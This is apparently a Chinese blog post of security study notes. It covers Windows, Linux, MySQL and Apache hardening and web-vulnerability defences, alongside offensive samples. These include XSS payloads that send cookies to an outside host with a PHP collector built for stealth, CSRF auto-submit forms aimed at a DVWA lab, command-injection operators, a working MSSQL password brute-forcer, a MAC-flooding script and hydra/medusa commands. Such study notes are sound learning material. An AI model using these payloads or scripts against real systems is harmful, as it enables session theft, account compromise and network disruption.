---
title: 目前折腾的一些总结
date: 2018-04-17 18:57:20
categories: Other
tags:
description:
---

目前折腾的一些总结
<!-- more -->
# Window

## 常用命令
 - 查看帮助
   - `net user ?/`
 - 基本信息
   - `Systeminfo` 计算机信息获取命令
   - `Whoami` 查看当前操作用户
   - `Ipconfig` ip地址获取命令
 - `Net user`用户操作命令
   `Net user admin 123456 /add`  添加用户名admin，密码123456的用户
   `Net user admin /del` 删除用户admin
   `Net localgroup administrators admin /add` 将用户admin添加到本地管理员组
 - 文件操作命令
   - `dir` 列文件目录清单
   - `del c:\1.txt` 删除文件 注意`\`
   - `copy 源文件 目标文件` 赋值文件
   - `echo b > a.txt` 新建文件，并将b写入其中 [具体看这](http://www.markjour.com/article/cmd-create-file.html)
 - 目录操作
   - `cd` 移动目录
   - `md`(mkdir) 创建目录
   - `rd`(rmdir) 删除目录 只能删除空目录
 - `Tasklist /svc` 进程获取命令
 - `Netstat -ano` 网络端口命令

<br>
## 安全加固
### 用户管理
我的电脑-账户管理-本地用户和组

### 帐户策略
管理工具-本地安全设置
里面可以对以下策略进行操作
 - 密码策略
 - 帐号锁定策略

### 防火墙配置
控制面板-Window防火墙
可配置
 - 防火墙开启关闭状态
 - 端口和IP的访问控制规则
 - ICMP
 - 防火墙日志

### 系统日志配置
管理工具-事件查看器
Window系统默认开启


### 服务管理
管理工具-服务


<br><br>
# Linux

## 常用命令

### 用户及用户组操作
 - `/etc/passwd`    存储用户账号
 - `/etc/group`       存储组账号
 - `/etc/shadow`    存储用户账号的密码
 - `/etc/gshadow`  存储用户组账号的密码

 - `useradd username`
 - `userdel username`
 - `groupadd groupname`
 - `groupdel groupname`
 - `passwd username`
 - `su username`
 - `chown root:root filename`

### 文件及文件权限操作
R 读 4 | W 写 2 | X 可执行  1
 - `sudo chmod u+x g+w o+r  filename`
 - `sudo chmod 765 filename`

### VI编辑器
vim三种模式：命令模式、插入模式、编辑模式。使用ESC或i或：来切换模式。
命令模式下：
 - `:q`       退出
 - `:q!`       强制退出
 - `:wq`       保存并退出
 - `:set number`     显示行号
 - `:set nonumber`  隐藏行号
 - `/apache`       在文档中查找apache 按n跳到下一个，shift+n上一个
 - `yyp`            复制光标所在行，并粘贴
 - h(左移一个字符←)、j(下一行↓)、k(上一行↑)、l(右移一个字符→)

### 打包
解包：tar xzvf FileName.tar
打包：tar czvf FileName.tar DirName
（注：tar是打包，不是压缩，适合将很多小文件备份）

解压：tar xzvf FileName.tar.gz
压缩：tar czvf FileName.tar.gz DirName
（一般常用的就是这个了）

### 服务
 - `service --status-all`
 - `service mysqld start/stop/restart`

### SHELL编程
略...

## 安全加固

### 帐户策略

#### 密码策略
```
vi /etc/login.defs
PASS_MAX_DAYS   99999     #密码的最大有效期, 99999:永久有期
PASS_MIN_DAYS   0          #是否可修改密码,0可修改,非0多少天后可修改
PASS_MIN_LEN    5          #密码最小长度,使用pam_cracklib module,该参数不再有效
PASS_WARN_AGE   7         #密码失效前多少天在用户登录时通知用户修改密码
```

#### 帐号锁定策略
```
/etc/pam.d/system-auth
不知道为什么必定放在首位才能生效
auth    required      pam_tally2.so  deny=3  unlock_time=10 even_deny_root root_unlock_time=10   在里面加入这一横

deny=n              失败登录次数超过n次后拒绝访问
lock_time=n         失败登录后锁定的时间（秒数）
unlock_time=n       超出失败登录次数限制后，解锁的时间
no_lock_time        不在日志文件/var/log/faillog 中记录.fail_locktime字段
magic_root          root用户(uid=0)调用该模块时，计数器不会递增
even_deny_root      root用户失败登录次数超过deny=n次后拒绝访问
root_unlock_time=n  与even_deny_root相对应的选项，如果配置该选项，则root用户在登录失败次数超出限制后被锁定指定时间
```

#### 口令复杂度策略
```
/etc/pam.d/system-auth
password requisite pam_cracklib.so retry=3 difok=3 minlen=10 ucredit=-1 lcredit=-2 dcredit=-1 ocredit=-1

retry=N，确定用户创建密码时允许重试的次数；
minlen=N，确定密码最小长度要求，事实上，在默认配置下，此参数代表密码最小长度为N-1；
dcredit=N，当N小于0时，代表新密码中数字字符数量不得少于（-N）个。例如，dcredit=-2代表密码中要至少包含两个数字字符；
ucredit=N，当N小于0时，代表则新密码中大写字符数量不得少于（-N）个；
lcredit=N，当N小于0时，代表则新密码中小写字符数量不得少于（-N）个；
```

### 设置登录超时时间
```
vi /etc/profile  # 里面一对代码，不用理
export TMOUT=600   # 添加这个代码在最后
source /etc/profile  # 不用重启就能生效

```

### 防火墙配置
开启防火墙
```
service iptables start  #即时生效，重启后复原设置访问命令
chkconfig iptables on/off   #Linux操作系统中永久性生效，重启后不会复原
```

防火墙规则配置
```
iptables -I INPUT -p tcp --dport 3306 -j ACCEPT
service iptables save  保存配置
iptables -L 查看规则

iptables-save  备份规则

-I
  INPUT链：处理输入数据包
  OUTPUT链：处理输出数据包
  PORWARD链：处理转发数据包
  PREROUTING链：用于目标地址转换（DNAT）
  POSTOUTING链：用于源地址转换（SNAT）
-p 协议
-s 源地址
--sport 源端口
--dport 目标端口
-j 动作 ACCEPT/DROP(丢弃数据包)
iptables -t 表名 <-A/I/D/R> 规则链名 [规则号] <-i/o 网卡名> -p 协议名 <-s 源IP/源子网> --sport 源端口 <-d 目标IP/目标子网> --dport 目标端口 -j 动作
```
[具体看这](https://blog.csdn.net/ivnetware/article/details/51264946)

### 服务策略
```
如果我们只是提供web服务，那么对于sendmail、nfs、postfix、ftp等不需要的服务就可以关闭了

关闭不需要的服务
chkconfig --list | grep "3:on"
chkconfig <servername> off

对于关键的服务，我们需要保证它们的运行，比如：iptables、sshd、syslog、httpd、nginx、mysql、php-fpm等。
```


### 日志配置

#### syslog配置
修改syslog.conf配置文件，将认证日志、邮件日志，备份存储到指定服务器
```
vi /etc/syslog.conf
mail.*                        @1.1.1.1
facility.level action
设备.优先级 动作

```
[具体看着](https://www.2cto.com/os/201301/183887.html)


## 其他特殊操作
### 使用root帐号登录系统，创建一个UID为0的帐号，然后使用一行命令查找本系统UID为0的帐号有哪些
```
useradd xxx  //创建用户
vi /etc/passwd //直接更改里面的uid和gid

su xxx
id  // 查看自身ID

cat /etc/passwd | grep :0:[0-9]*:  查看所有UID为0的账户
cat /etc/passwd | awk -F: '$3==0'  同上，更标准

```

### 修改ssh的配置文件，禁止root直接登录，退出所有账号，使用root直接ssh登录操作系统
```
vi /etc/ssh/ssh_config   # 进入ssh配置文件
PermitRootLogin yes/no   # 改为no
service sshd restart     # 重启SSH
```

### 对系统账号进行登录限制
```
cat /etc/passwd | grep /bin/bash   查看进入shell的是否有系统帐号
有的话改为/usr/sbin/nologin
```

<br><br>


# WEB

## 知识储备

### 常用过滤函数
 - `trim(str, charlist)`
 - `int eregi(string pattern, string str)`
 检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。
 - `str_replace(search, replace, subject)`
 该函数返回一个字符串或者数组。该字符串或数组是将 subject 中全部的 search 都被 replace 替换之后的结果。忽略大小写使用str_ireplace()
 - `strstr(str, searchStr)`
 查找字符串的首次出现。忽略大小写用stristr()
 - `preg_replace(pattern, replace, str)`

## SQLI
### 防御
#### 过滤函数
 - `addslashes(str)`
 - `mysql_real_escape_string()`
 - `mysql_escape_string(str)`

#### mysqli
```php
$mysqli = new mysqli("localhost", "root", "123123", "security");
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param('d', $_GET['id']);
$stmt->execute();
$res = $stmt->get_result();
$row = $res->fetch_assoc();
var_dump($row);
```

#### pdo
```php
$pdo = new PDO("mysql:host=localhost;dbname=security;",'root','123123');
// $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES,false);
$pdo->exec('set names utf8');
$sql = "select * from users where id = ?";
$statement = $pdo->prepare($sql);
$statement->bindParam(1, $_GET['id']);
$statement->execute();
$ret = $statement->fetchAll();
var_dump($ret);
```


## XSS

### 发送Cookie
`<script>window.open("http://10.128.2.165:8088/accept_cookie.php?cookie="+document.cookie)</script>`
`<script>document.location="http://www.b.com/1.asp?msg="+document.cookie;</script>`

### 接收Cookie
### 第一种
```php
$cookie = $_GET['cookie'];
$myFile = "cookie.txt";
file_put_contents($myFile, $cookie);
```
### 第二种
```php
$cookie = $_GET['cookie'];            //以GET方式获取cookie变量值
$ip = getenv ('REMOTE_ADDR');        //远程主机IP地址
$time=date('Y-m-d g:i:s');            //以“年-月-日 时：分：秒”的格式显示时间
$referer=getenv ('HTTP_REFERER');    //链接来源
$agent = $_SERVER['HTTP_USER_AGENT'];    //用户浏览器类型
$fp = fopen('cookie.txt', 'a');        //打开cookie.txt，若不存在则创建它
fwrite($fp," IP: " .$ip. "\n Date and Time: " .$time. "\n User Agent:".$agent."\n Referer: ".$referer."\n Cookie: ".$cookie."\n\n\n");    //写入文件
fclose($fp);    //关闭文件
header("Location: http://www.baidu.com");  //将网页重定向到百度，增强隐蔽性
```
### 防御
```
htmlspecialchars($str, ENT_QUOTES)  # ENT_QUOTES -- 单引号也转换
将一些特殊字符转换为HTML实体字符
显示	实体名字	实体编号
<	    &lt;	    &#60;
>	    &gt;	    &#62;
&	    &amp;	    &#38;
“	    &quot;	  &#34;
‘	    N/A	      &#39;

与其类型的还有
htmlentities($str, ENT_QUOTES) # 与htmlspecialchars不同的是会对无法识别的中文字符也转换


自定义的XSS filter

待完善
```
`str_replace( '<script>', '', $_GET[ 'name' ] );`
`preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] )`


<br>
## CSRF
CSRF攻击其实就是直接利用你的身份去做一些事情,XSS不同的是拿到你的身份
例如一个注册界面，如果我伪造一个注册请求，并且诱导管理员去发送这个请求(管理员的COOKIE就是身份验证)，那么就利用了管理员的身份去完成了注册请求。

### 利用方式
### 第一种
直接设置一个链接，让受害人点击`<a href="xxx">点击打开红包</a>`


### 第二种
IMG标签会自动发送请求
`<img src="http://10.128.2.247/DVWA/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/>`

### 第三种
自动提交脚本页面代码
```html
<script>
function s(){
        document.getElementById('form').submit();
}
</script>
<body onload=s()>
<form action="http://10.128.2.247/DVWA/vulnerabilities/csrf/" method="get" id="form">
<input type='hidden' name="password_new" value="123123">
<input type='hidden' name="password_conf" value="123123">
<input type='hidden' name="Change" value="Change">
</form>
</body>
```

### 防御

#### 利用过滤手段
 - DVWA-MID
 `eregi( $_SERVER[ 'SERVER_NAME' ], $_SERVER[ 'HTTP_REFERER' ] )` 判断REFERER中是否有HOST的内容相同

#### 利用Token
在刚进入页面的时候，生成一个TOKEN，在提交表单前，必须提交生成的TOKEN，才能进行操作下一步操作。
```
页面功能为根据用户名更改密码


// 无防护
// if(isset($_POST['username']))
// {
// 	include("./sql-connect.php");
// 	$username = $_POST['username'];
// 	$newpwd = $_POST['newpwd'];
// 	$sql = "update users set password='$newpwd' where username='$username'";
// 	$result = mysql_query($sql);
// 	if($result){
// 		echo "update success!!!";
// 	}else{
// 		echo "update error";
// 	}
// }


// 开启防护
session_start();
if(isset($_POST['username']) && isset($_POST['csrf_token'])){
	// 验证Token是否正确
	if($_POST['csrf_token'] == $_SESSION['csrf_token']){
		include("./sql-connect.php");
		$username = $_POST['username'];
		$newpwd = $_POST['newpwd'];
		$sql = "update users set password='$newpwd' where username='$username'";
		$result = mysql_query($sql);
		if($result){
			echo "update success!!!";
		}else{
			echo "update error";
		}
	}else{
		echo "token error!!!";
	}
}else{
	// 生成Token
	$csrf_token = md5(uniqid());
	$_SESSION['csrf_token'] = $csrf_token;
}
```


**绕过手段**
利用其他漏洞，先让管理员去访问页面并且将TOKEN传给攻击者(例如利用存储XSS)，然后在诱导管理员访问伪造请求页面


<br>



## File Include


## File Upload

### 防御
利用白名单检测
```
if(isset($_POST["submit"])){
    // 检测Content-type
    if($_FILES['fupload']['type'] != "image/gif")
    {
        exit("Only upload GIF images.");
    }
    // 基本参数
    $file_name = $_FILES['fupload']['name']; // 文件名
    $file_ext  = substr($file_name, strrpos($file_name,'.') + 1); //文件后缀
    $file_tmp  = $_FILES['fupload']['tmp_name']; //临时文件
    $target_path = "uploads/".md5(uniqid(rand())).".".$file_ext; //存储路径与名称
    // 检测后缀名
    if($file_ext!="gif"){
        exit("Only upload GIF images.");
    }
    // 移动临时文件
    if(move_uploaded_file($file_tmp, $target_path)){
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
    else{
        echo '<pre>upload error</pre>';
    }
}
```




<br>
## Common Injection
 - `system()` 调用该函数后会自动打印参数
 - `exec()`  一般不会输入，有时候可能会有一行
 - `shell_exec()` 无返回结果
 - `passthru ( string $command [, int &$return_var ] )`
 - `pcntl_exec ( "/bin/bash" , array("whoami"));`

```php
echo `ping 127.0.0.1`;
在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。
```

### 常用注入语句
```
`shell_command`  执行shell_command命令
$(shell_command) 执行shell_command命令
| shell_command 执行shell_command命令并返回结果
|| shell_command 执行shell_command命令并返回结果
; shell_command 执行shell_command命令并返回结果
&& shell_command 执行shell_command命令并返回结果
> target_file 返回结果覆盖到target_file里
>> target_file 返回结果追加到target_file里
< target_file 把target_file的内容输入到之前的命令当中
- operator 给目标指令添加额外的参数
```

### 实验代码
`echo shell_exec("ping ".$_GET['cmd']);`

### 技巧
 - `ping 127.0.0.1 && net user` 先执行前者，执行成功后执行后者，不成功不执行
 - `ping 127.0.0.1 & net user` 不论前者成功不成功都执行后者
 - `ping 127.0.0.1 | net user` 管道符，将前者的输出作为后者的输入，并且只回显后者

### 防护
```
$clean = array();
$shell = array();

/* Filter Input ($command, $argument) */

$shell['command'] = escapeshellcmd($clean['command']);
$shell['argument'] = escapeshellarg($clean['argument']);

$last = exec("{$shell['command']} {$shell['argument']}", $output, $return);



利用正则或其他规则对参数进行严格匹配
过滤关键字符

```
<br><br>



# MYSQL安全加固
 - `MySQL` - MySQL服务器
 - `MySQL-client` - MySQL 客户端程序
 - `mysqladmin` - MySQL管理工具
 - 关于[mysqld_safe](http://blog.51cto.com/wolfword/1241303)

## 基本命令
 - `DELETE FROM 表名称 WHERE 列名称 = 值`
 - `UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值`
 - `INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)`
 - `drop database test` 删除数据库
 - `flush privileges` 刷新系统权限表 (设置用户或更改密码后)
 - `UPDATE user SET Password = PASSWORD('newpass') WHERE user = 'root'` 修改root密码

## 配置文件
Linux上面很多新版本的软件都将配置文件分割了，这已经是一种风格了
 - `my.cnf` mysql配置文档
 如果该文件没有包含其他文件目录的话，说明配置都写这个文件内，如果包含，那么就在其他文件中。

一些经常用到的参数
 - `max_user_connections = 3000` 允许同时连接的相同用户最大连接数 [具体还可以看这](http://blog.51cto.com/keyman/1652220)

## 日志文件
`less /var/log/secure`

`show variables like '%log%'` 查看日志配置
`set global general_log=1` 开启日志   -- mysql 5.1之后可以这样配置

 - `log_error`
   - 在mysql数据库中，错误日志功能是默认开启的。并且，错误日志无法被禁止。
   - `show variables like 'log_error'`
 - `log` or `general_log`
   - 默认情况下查询日志是关闭的。由于查询日志会记录用户的所有操作，其中还包含增删查改等信息
 - `log-slow-queries` 慢查询日志
 - `innodb_log` 事务日志
 - `log_bin` 二进制日志
   - 二进制日志也叫作变更日志，主要用于记录修改数据或有可能引起数据改变的mysql语句

## 一些命令
 - `mysqladmin -u root password "new_password"`
 - `mysql -h 主机 -u root -p`
 - `CREATE USER 'username'@'host' IDENTIFIED BY 'password';` 创建用户

## 删除默认数据库和空密码用户
```
drop database test;
delete from mysql.user where user='root' and passwod='';
flush privileges;
```

## 修改默认管理员帐号
```
update mysql.user set user="newroot" where user="root";
flush privileges;
```

## 禁止远程连接数据库
```
vi /etc/my.cnf
skip-networking  加入这句话
service mysqld restart

或者

/usr/bin/mysqld_safe --skip-networking
```
## 限制(用户)最大连接数
```
vi /etc/my.cnf
max_user_connections=100
max_connections=100  如果只是说最大连接数就选择这个
service mysqld restart
```

## 以独立用户运行MYSQL
```
vi /etc/my.cnf
user=mysql

或者

/usr/bin/mysqld_safe --user=mysql
```
## 限制用户目录权限
```
给MYSQL安装路径ROOT用户
给MYSQL数据库存在路径给mysql用户
chown -R root /usr/local/mysql/ //mysql主目录给root
chown -R mysql.mysql /usr/local/mysql/var //确保数据库目录权限所属mysql用户
```

## 禁止MYSQL对本地文件存取
```
vi /etc/my.cnf
local-infile=0  加上这句话

或者

/usr/bin/mysqld_safe --user=mysql --local-infile=0 --skip-networking
```

## 开启访问审计
mysql 5.1之后可以这样配置
```
show (global) variables like '%log%'; 查看日志配置
set global general_log=ON/OFF; 开启GENERAL日志
```


## 限制用户登录IP
`grant all privileges on *.* to admin@xxx.xxx.xxx.xxx identified by 'passowrd';` 利用grant
`update mysql.user set Host='x.x.x.x' where user='users'` 直接更改

## 找到匿名用户
`SELECT Host,User FROM mysql.user`
匿名账户的User字段为空

## 限制一般用户浏览其他用户数据库
```
/usr/bin/mysqld_safe --skip-show-database
```

## MYSQL启动项
`/usr/bin/mysqld_safe --user=mysql --local-infile=0 --skip-networking`

 - `--skip-name-networking`
   - 不监听 sql 的任何 TCP/IP 的连接，切断远程访问的权利
 - `--skip-show-database`
   - 只有`show database`权限用户可以显示全部用户名，不启用所有用户都是show



[具体参考这](https://vxhly.github.io/2016/10/mysql-database-user-policy/)

<br><br>



# 服务器安全加固


## IIS
以下内容在属性中都可找到
 - 身份验证
 - IP设置
 - 日志配置
 - 错误页面自定义
 - 删除不必要的脚本映射
 - 删除默认站点
 - SSL+申请证书



## APACHE
`/etc/httpd/conf/httpd.conf`

 - `ServerRoot "/usr/local/apache2/"`  apache主目录
 - `Listen 80`   监听端口
 - `User daemon Group deamon`   apache的进程执行者
 - `DocumentRoot "/usr/local/apache2//htdocs"`  网站根目录
 - `ErrorLog "logs/error_log"`  错误日志
 - `CustomLog "logs/access_log" common`  访问日志
 - `ErrorDocument 404 /missing.html`  错误页面文档
 - `Options FollowSymLinks MultiViews`  去掉Indexes,目录就不会显示

### 设置网站根目录的访问权限
```
<Directory "/usr/local/apache2//htdocs">
    Options Indexes FollowSymLinks MultiViews
    AllowOverride None
    Order allow,deny
    Deny from all # 拒绝所有
    Allow from all # 允许所有
    <Location /dir/>
       Order allow,deny
       allow from 1.1.1.1
    </Location>
</Directory>

Deny from 10.0.0.1 #阻止一个IP
Deny from 192.168.0.0/24 #阻止一个IP段

# Allow from all 参数允许所有人访问/usr/local/apache2//htdocs 下的资源
# Options Indexes 参数:访问目录时,如果不存在默认首页则展示站点列表 该行建议改成 Options None
# Options FollowSymLinks 参数:是否允许快捷方式(ln -s 软连接)
# Options MultiViews 多视图,访问/index 等同访问 index.php或index.html

Order指令控制默认的访问状态与Allow和Deny指令生效的顺序。Ordering取值范围是以下几种范例之一：

Deny,Allow
Deny指令在Allow指令之前被评估。默认允许所有访问。任何不匹配Deny指令或者匹配Allow指令的客户都被允许访问。
Allow,Deny
Allow指令在Deny指令之前被评估。默认拒绝所有访问。任何不匹配Allow指令或者匹配Deny指令的客户都将被禁止访问。


2.4之后使用Require来控制
Require ip 10 172.20 192.168.2
Require ip 10.1.0.0/16
Require all granted #拒绝所有
```


### 隐藏Apache的版本号及其它敏感信息
```
在配置文件中设置以下两条即可
ServerTokens Prod
ServerSignature Off


Prod >>> Server: Apache
Major >>> Server: Apache/2
Minor >>> Server: Apache/2.0
Minimal >>> Server: Apache/2.0.55
OS >>> Server: Apache/2.0.55 (Debian)

Off (default): 不输出任何页脚信息 （如同Apache1.2以及更旧版本，用于迷惑）
On:输出一行关于版本号以及处于运行中的虚拟主机的ServerName (2.0.44之后的版本，由ServerTokens负责是否输出版本号）
EMail: 创建一个发送给ServerAdmin的"mailto"
```





## FTP(IIS)

## FTP(Linux)
`/etc/vsftpd/vsftpd.conf` 配置文件'

[具体看这](https://zengjunpeng.com/?id=111)


# Python

## 知识储备
`scapy`
 - 发送数据包
   - send()函数将会在第3层发送数据包。也就是说它会为你处理路由和第2层的数据。
   - sendp()函数将会工作在第2层。选择合适的接口和正确的链路层协议都取决于你。
 - 发送和接收数据包(sr)
   - r()函数是用来发送数据包和接收应答。该函数返回一对数据包及其应答，还有无应答的数据包。
   - sr1()函数是一种变体，用来返回一个应答数据包。发送的数据包必须是第3层报文（IP，ARP等）。
   - srp()则是使用第2层报文（以太网，802.3等）。


[简单介绍](http://www.bubuko.com/infodetail-2094512.html)

## 操作系统指纹识别
OS的识别技术多种多样，有简单的也有复杂的，最简单的就是用TTL值去识别。不同类型的OS默认的起始TTL值是不同的，比如，windows的默认是128，然后每经过一个路由，TTL值减一。Linux/Unix的值是64，但有些特殊的Unix会是255。



### 利用TTL识别
```python
#!/usr/bin/python
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import sys

if len(sys.argv) != 2:
    print("Usage --/ttl_os.py [IP Address]")
    print("Example --/ttl_os.py 192.168.0.1")
    print("Example will preform ttl analysis to attempt to determine whether the system is windows or linux/unix")
    sys.exit()

ip = sys.argv[1]

ans = sr1(IP(dst=str(ip))/ICMP(), timeout=1, verbose=0)
if ans == None:
    print("NO response was returned")
elif int(ans[IP].ttl)<=64:
    print("Host is Linux/Unix")
else:
    print("Host is Windows")
```

[参考](https://www.jianshu.com/p/f3d789d8a8d1)



## 爆破MSSQL
利用简单的数据库的连接就能判断密码是否正确。对于mssql而言，每个用户始终都存在这个tempdb，到时候连接的时候直接连接这个库就行。

```python
#!/usr/bin/env python
#coding=utf-8

#-----------------------------------------------
#Author: CRoot
#descript:mssql psaaword burte

import pymssql
import argparse
from colorama import Fore,Style

def chekpassword(ms_server,ms_user,ms_password):
    #connect mssql to check password
    try:
        conn = pymssql.connect(ms_server,ms_user.strip('\n'),ms_password.strip('\n'),'tempdb',charset='UTF-8')
        cur = conn.cursor()
        if not cur:
            return 0
        else:
            return 1
    except Exception as Error:
        return 0
    return 1
def DictAttck(Host,UsernameFile,PasswordFile):
    UserHandle = open(UsernameFile)
    for user in UserHandle:
        PwdHandle = open(PasswordFile)
        for pwd in PwdHandle:
            print Fore.RED + "[***] " + Style.RESET_ALL + "Try to UserName:%s  Password:%s"%(user,pwd)
            if chekpassword(Host,user,pwd) == 1:
                print Fore.GREEN + "[OK] " + Style.RESET_ALL + "Got password. Username:%s Password:%s" %(user,pwd)
                break

def FixUserAttack(Host,Username,PasswordFile):
    PwdHandle = open(PasswordFile)
    for line in PwdHandle:
        print Fore.RED + "[***] " + Style.RESET_ALL + "Try to UserName:%s  Password:%s"%(Username,line)
        if chekpassword(Host,Username,line) == 1:
            print Fore.GREEN + "[OK] " + Style.RESET_ALL + "Got password. Username:%s Password:%s" %(Username,line)
            break
def main():
    parser = argparse.ArgumentParser(description='Attack mssql server password by CRoot')
    parser.add_argument('-s',metavar='HostAddr',help='Set host address')
    parser.add_argument('-l',metavar='Username',help='FixUser to attack')
    parser.add_argument('-L',metavar='Username File',help='Use username dictionary to attach')
    parser.add_argument('-P',metavar='Password File',help='Use password dictionary to attach')
    option = parser.parse_args()

    if option.s == None:
        parser.print_help()
        exit(0)

    if option.l != None and option.P != None:
        FixUserAttack(option.s,option.l,option.P)
    elif option.L != None and option.P != None:
        DictAttck(option.s,option.L,option.P)
    else:
        parser.print_help()



if __name__ == '__main__':
    main()
```
[具体看着](http://xcroot.com/HelloWord/383.sh)


## MAC FLOODING
交换机和其他计算机一样，具有有限的内存，交换机中存放MAC地址信息的表格也同样如此，该表格记录哪个MAC地址对应哪个端口及其内部的ARP缓存。当交换机的缓冲区溢出时，它们的反应就会有些古怪。这将会导致交换机拒绝服务，以至于放弃交换行为而变得像正常的集线器。在集线器模式下，整体的高流量不会是你遇到的唯一问题，因此在没有附加操作下，所有已连接的计算机都会接收到完整的流量。你应该测试一下的你的交换机在这种意外情况下是如何反应的，接下来的脚本就可以做到这一点。它会产生随机的MAC地址，并将它们发送到你的交换机中，直到交换机的缓冲区被填满。

`pip install Scapy` 数据包生成器
```python
#!python
#!/usr/bin/python

import sys
from scapy.all import *

packet = Ether(src=RandMAC("*:*:*:*:*:*"),
                        dst=RandMAC("*:*:*:*:*:*")) / \
                        IP(src=RandIP("*.*.*.*"),
                            dst=RandIP("*.*.*.*")) / \
                        ICMP()

if len(sys.argv) < 2:
        dev = "eth0"
else:
        dev = sys.argv[1]

print "Flooding net with random packets on dev " + dev

sendp(packet, iface=dev, loop=1)
```

具体看这[Python网络攻防之第二层攻击](http://drops.xmd5.com/static/drops/tips-8547.html)


<br><br>


# 缓冲区溢出
缓冲区是一块用于存放数据的临时内存空间，它的长度事先已经被程序或者操作系统定义好。缓冲区类似于一个杯子，
写入的数据类似于倒入的水。缓冲区溢出就是将长度超过缓冲区大小的数据写入程序的缓冲区，
造成缓冲区的溢出，从而破坏程序的堆栈，使程序转而执行其他指令。
非安全字符串`strcpy()、sprintf()、gets()、strcat、scanf、vscanf`

# 爆破与扫描

## Kail
`hydra -l administrator -P pass.txt -V -t 32 IP telnet/ssh/rdp/ftp `
`medusa –h 192.168.235.96 –u root –P /pentest/passwords/wordlists/rockyou.txt -t 10 –M ssh`  注意密码匹配后不会在最后显示


<br>
# 密码嗅探

## FTP
命令行输入`ftp`,在输入`open 192.168.1.100`,会提示输入帐号密码
里面的命令可以使用`?`或`help`查看

wireshark抓包，直接能在`info`字段看见明文的用户名和密码或者
右键追踪TCP数据流，也能看见登录信息


<br>
## HTTP
直接右键跟追数据流 找GET或者POST中是否带有帐号密码字段信息。
更具体的看登录界面的方式


<br>
## TELNET
`telnet 192.168.1.100`


tcp.port== 23 and ip.dst==192.168.1.100
wireshark抓包直接右键追踪TCP数据流可以看见账户密码。帐号会重复。
(注意退格删除，图中我就已经进行了退格删除，这种情况在去单个分析包找到`\b`即可知道)

![telnet](telnet.png)



<br><br>
